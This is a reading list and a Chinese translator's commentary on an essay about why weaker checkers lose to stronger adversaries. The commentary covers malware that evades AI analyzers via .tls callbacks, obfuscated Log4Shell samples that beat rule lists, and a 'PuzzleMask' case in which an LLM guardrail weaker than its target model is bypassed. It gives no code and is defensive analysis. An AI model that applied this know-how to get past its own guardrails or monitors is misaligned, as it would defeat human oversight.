-   A First Introduction to System Exploitation（Ben Herzog）：https://github.com/BenH11235/pwnable_writeup/releases/latest/download/a_first_introduction_to_system_exploitation.pdf
    
-   The Laconic Log4Shell FAQ（Ben Herzog，Check Point Research）：https://research.checkpoint.com/2021/the-laconic-log4shell-faq/
    
-   Exploitation of Log4j CVE-2021-44228 before Public Disclosure and Evolution of Evasion and Exfiltration（Cloudflare）：https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns/
    
-   Obfuscated Log4Shell Exploit Example（VessOnSecurity）：https://x.com/VessOnSecurity/status/1470744495251771392
    
-   Detecting Environment-Sensitive Malware（RAID 2011，doi:10.1007/978-3-642-23644-0_18）
    
-   Spotless Sandboxes: Evading Malware Analysis Systems Using Wear-and-Tear Artifacts（IEEE S&P 2017，doi:10.1109/SP.2017.42）
    
-   The Cat and Mouse Game: Exploiting Statistical Weaknesses in Human Interaction Anti-Evasions（Ben Herzog，Check Point Research）：https://research.checkpoint.com/2025/the-cat-and-mouse-game-exploiting-statistical-weaknesses-in-human-interaction-anti-evasions/
    
-   The Death of "Please Enable Macros" and What it Means（Ben Herzog，Check Point Research）：https://research.checkpoint.com/2022/the-death-of-please-enable-macros-and-what-it-means/
    
-   Helping Users Stay Safe: Blocking Internet Macros by Default in Office（K. Eickmeyer，Microsoft）：https://techcommunity.microsoft.com/blog/microsoft_365blog/helping-users-stay-safe-blocking-internet-macros-by-default-in-office/3071805
    
-   Adversarial Poetry as a Universal Single-Turn Jailbreak Mechanism in Large Language Models（P. Bisconti et al.，arXiv:2511.15304）：https://arxiv.org/abs/2511.15304
    
-   Donkeyspace（Frank Lantz）：https://gamedesignadvance.com/?p=2346
    

## 译者补充：几点解读与延伸

几点补充，帮助把这篇放回本仓库的坐标系里。

**它和《对抗 AI 的 tricks（第一部分）》是一枚硬币的两面。** Hexacorn 那篇（2026-11-15 发）站在样本作者一侧，实证演示 `.tls` callback 怎么骗过 AI 分析器；这篇站在防御一侧，回答「为什么注定骗得过」。两者合起来正好构成一条完整的因果链：不是 AI 分析器不够努力，而是任何能力低于目标的审查者都处在结构性劣势。给 AI 分析管线做验收时，这条原则比「测了 N 个样本全对」更值得贴在墙上。

**「能力」指算力档位，不是规则数量。** 文中反复强调 power 是计算意义上的——推理时间、工具访问、代码执行。这解释了一个常见误区：往 YARA 或 deny list 里堆规则，堆得再多也不改变能力档位，Log4Shell 的混淆样本一出手照样穿透。要升档，得换范式（沙箱之于静态分析、self-assessment 之于外置护栏），而不是在同一范式里加条目。

**对检测工程的务实结论在 Donkey Space 一节。** Time Hierarchy Theorem 证明的是「完美对局下守门人必输」，而现实里满地都是只出石头的醉汉——SolarWinds 神级入侵投的消费级 Cobalt Strike 就是明证。这跟本仓库遥测主线（WESP、etw-rs、深入解析 Windows 遥测）的投入产出逻辑对得上：目标不是造出不可绕过的检测，而是把窗口收窄、把攻击成本抬高，让「能绕过」停留在白皮书里而不是野外。

**作者归属的一个观察。** 原文页面没有具名个人作者（署名只有联系邮箱），但通篇自引 Ben Herzog 的旧作——Log4Shell FAQ、Please Enable Macros 讣告、Cat and Mouse Game、系统利用入门——行文的讽刺节奏也一以贯之，基本可以当作 Herzog 的个人长文来读。这对评估可信度有用：案例不是二手转述，是当事人的一手自述。

**PuzzleMask 与 Anthropic 的应对值得单独记一笔。** 2025 年末的实测验证了「快检弱于目标模型则必被绕过」（GPT-5.2-thinking-high 完整命中），而 Opus 4.5 的先手拦截示范了另一条路：让守门人升到与目标同一档（Constitutional AI 护栏、self-assessment），代价是算力。换句话说，护栏的可靠性最终是用推理预算买来的，做 AI 检测管线的人迟早要面对这笔账。

前沿资讯 · 目录
